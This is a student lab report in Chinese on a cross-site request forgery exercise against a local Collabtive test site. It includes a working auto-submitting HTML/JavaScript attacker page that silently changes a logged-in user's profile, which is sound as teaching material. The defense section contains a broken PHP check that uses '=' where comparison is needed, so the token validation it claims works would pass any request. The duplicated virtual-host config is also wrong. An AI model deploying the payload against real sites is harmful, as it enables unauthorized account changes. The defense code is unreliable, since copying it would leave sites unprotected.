#信息安全实验
_Dong 2015210938_

_2016.04.23_

##CSRF:跨站请求伪造攻击
###攻击简介
在网络环境中，用户使用单个浏览器浏览可信任网页，攻击者利用恶意网站以受害用户的身份向可信任网站发起恶意请求。
###实验原理
在用户使用账号密码登陆到可信任站点后，受信任站点会在web浏览器存储cookie，并且在接下来的操作中不需要进行身份验证。这样恶意网站就可以使用脚本通过浏览器提交恶意请求到受信任站点，因为之前已经进行过了身份验证，受信任站点接受恶意请求操作。
###实验步骤
####配置网站
首先启动apache2和mysql_safe，让本地服务器启动起来。

	sudo service apache2 start
	sudo mysqld_safe

并且配置DNS域名解析，将模拟域名都解析到本地，添加一下内容到`/etc/hosts`中

	127.0.0.1	www.heyheyattacker.com
	127.0.0.1	www.heyheynormal.com

并且在`/etc/apache2/conf.d/lab1.conf`和`/etc/apache2/conf.d/lab2.conf`中分别配置网站

	<VirtualHost *:80>
		ServerName http://www.heyheyattacker.com
		DocumentRoot /var/www/CSRF/Attacker/
	</VirtualHost>


	<VirtualHost *:80>
		ServerName http://www.heyheyattacker.com
		DocumentRoot /var/www/CSRF/Attacker/
	</VirtualHost>
####**攻击**
在攻击者的服务器里制作个攻击网页。其中包含提交恶意申请的javascript脚本。
将以下内容的作为文件`index.html`保存在`/var/www/CSRF/Attacker`中：
	
	<html><body><h1>
	This page forges an HTTP POST request.
	</h1>
	<script>
	function post(url,fields)
	{
	//create a <formelement.
	var p = document.createElement('form');
	//construct the form
	p.action = url;
	p.innerHTML = fields;
	p.target = '_self';
	p.method = 'post';
	//append the form to the current page.
	document.body.appendChild(p);
	//submit the form
	p.submit();
	}
	function csrf_hack()
	{
	var fields;
	// The following are form entries that need to be filled out
	// by attackers. The entries are made hidden, so the victim
	// won't be able to see them.
	fields += "<input type='hidden' name='name' value='peter'>"; //修改用户名
	fields += "<input type='hidden' name='userfile' value=''>";  
	fields += "<input type='hidden' name='company' value='seed'>";  //修改公司名
	post('http://www.heyheynormal.com/manageuser.php?action=edit',fields);
	}
	// invoke csrf_hack() after the page is loaded.
	window.onload = function() { csrf_hack(); }
	</script>
	</body></html>

其中`csrf_hack()`函数中的：

	fields += "<input type='hidden' name='name' value='peter'>"; //修改用户名
	fields += "<input type='hidden' name='userfile' value=''>";  
	fields += "<input type='hidden' name='company' value='seed'>";  //修改公司名
	post('http://www.heyheynormal.com/manageuser.php?action=edit',fields);

即为提交恶意请求的关键。

实验结果：在用户登录之后，访问`www.heyheyattacker.com`。用户的账号信息被更改，用户名被更改为`peter`，公司改为`seed`。

在打开`www.heyheyattacker.com`之后，用户的信息便被修改。
####**防御**
可以通过添加伪随机数的方法来防御跨站攻击。

实验中通过将document.cookie提交给要访问的可信任站点，并在之后的操作中可信任站点都对这个值进行验证，如果攻击者不能窃取可信任网站的cookie则在提交恶意请求时，不能通过可信任站点的有效验证，则攻击失效。

在可信任网页`/var/www/CSRF/Collabtive/templates/standard/edituserform.tpl`提交POST时提交一个隐藏的input，值为`document.cookie`。

而后可信任站点在接受到请求后在`manageuser.php`中对值进行验证

	...
	$sid = getArrayVal($_POST, "sid");
	...
	if($_COOKIE["PHPSESSID"]=$sid)
	...

实验结果：再次访问`www.heyheyattacker.com`并不能对用户信息进行更改。

###实验思考
CSRF攻击利用的是，用户在进行登录验证之后，和可信任站点交互不会再进行相互认证这个漏洞。因此只要想法在用户登录之后能有信息似的用户和可信任站点之间能够相互验证，并且在攻击者不能获得这份信息的前提下，就能有效避免这类攻击，就像这里的cookie信息。


----------
实验来自`实验楼`


